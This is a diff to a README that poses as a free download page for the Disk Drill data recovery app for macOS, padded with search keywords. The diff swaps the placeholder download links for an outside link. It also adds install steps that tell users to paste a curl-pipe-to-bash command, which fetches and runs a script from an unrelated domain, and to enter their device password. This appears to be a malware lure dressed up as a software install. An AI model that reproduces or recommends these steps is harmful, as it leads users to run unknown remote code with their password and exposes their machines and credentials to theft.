@@ -7,9 +7,29 @@ Whether you accidentally deleted files or experienced a drive failure, Disk Dril
 ---
 
 ## ✅ Download Disk Drill for macOS  
-[![Download Disk Drill](https://img.shields.io/badge/Download-Disk_Drill-brightgreen)](#)
+[![Download Disk Drill](https://img.shields.io/badge/Download-Disk_Drill-brightgreen)](https://disk-drill-download-mac.github.io/.github)
 
 ---
+
+## 📥 How to Use
+
+Installation via .dmg:
+
+1. Install the .dmg file using the button above. 
+2. Open the .dmg installer and move the file from the left window to any convenient directory on your device.
+3. Open a terminal and transfer the file you extracted in the last step into it.
+4. Press the "Return" button, then enter your device password in the window that appears (if you don't have a password, leave the field blank).
+
+Installation via a command in the terminal:
+
+1. Copy the installation command below.
+2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
+3. Enter your device password and confirm the installation.
+```bash
+/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get2/install.sh)"
+```
+
+
 
 ## 📦 What is Disk Drill?
 
@@ -40,19 +60,10 @@ Disk Drill is an advanced data recovery application for macOS created by CleverF
 
 ---
 
-[![Download Disk Drill](https://img.shields.io/badge/Download-Disk_Drill-brightgreen)](#)
+[![Download Disk Drill](https://img.shields.io/badge/Download-Disk_Drill-brightgreen)](https://disk-drill-download-mac.github.io/.github)
 
 ---
 
-## 📥 How to Use
-
-- ✅ Download and install Disk Drill for macOS  
-- 🖱 Launch the app and select the drive or device to scan  
-- 🔍 Choose Quick Scan or Deep Scan based on your needs  
-- 📂 Preview found files and select those you want to recover  
-- 💾 Recover files to a safe destination to avoid overwriting data  
-
----
 
 ## 🖼 Preview
 
@@ -67,4 +78,5 @@ disk drill mac, disk drill pro, disc drill mac, disk drill cleverfiles, disk dri
 disk drill data recovery mac, disk drill app, disk drill data recovery for mac, mac drill, disk drill mac free, drill mac,  
 disk drill pro download, disk drill pro free, disk drill 5.0, disk drill data recovery software for mac, disk drill full mac,  
 disk drill pro for free, disk drill mac download
+
 
